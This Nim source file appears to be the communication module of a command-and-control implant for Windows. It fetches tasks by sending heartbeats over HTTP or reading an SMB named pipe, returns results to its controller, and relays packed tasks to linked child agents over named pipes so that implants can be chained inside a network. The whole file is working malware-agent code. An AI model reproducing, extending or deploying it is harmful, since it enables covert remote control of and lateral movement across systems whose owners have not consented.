import winim/lean, tables, strformat
import ./transport/[http, smb]
import ../protocol/heartbeat
import ../utils/io
import ../../../common/[serialize, utils]
import ../../../types/[common, agent, protocol]

proc getTasks*(ctx: AgentCtx): string = 
    when defined(TRANSPORT_HTTP):
        var heartbeat: Heartbeat = ctx.createHeartbeat()
        let heartbeatBytes: seq[byte] = ctx.serializeHeartbeat(heartbeat)
        return ctx.httpGet(heartbeatBytes)
    
    when defined(TRANSPORT_SMB): 
        return ctx.smbRead(ctx.transport.hPipe)

proc sendData*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} = 
    when defined(TRANSPORT_HTTP): 
        return ctx.httpPost(data)

    when defined(TRANSPORT_SMB): 
        return ctx.smbWrite(data)

proc forward*(ctx: AgentCtx, agentId: uint32, tasks: seq[seq[byte]], indirectChildTasks: seq[byte] = @[]): bool = 
    var packer = Packer.init()
    
    if tasks.len() > 0:
        packer.add(agentId)
        packer.add(cast[uint8](tasks.len()))
        for task in tasks:
            packer.addDataWithLengthPrefix(task)
    if indirectChildTasks.len() > 0:
        packer.addData(indirectChildTasks)
    
    let hPipe = cast[HANDLE](ctx.links[agentId]) 
    return hPipe.pipeWrite(packer.pack())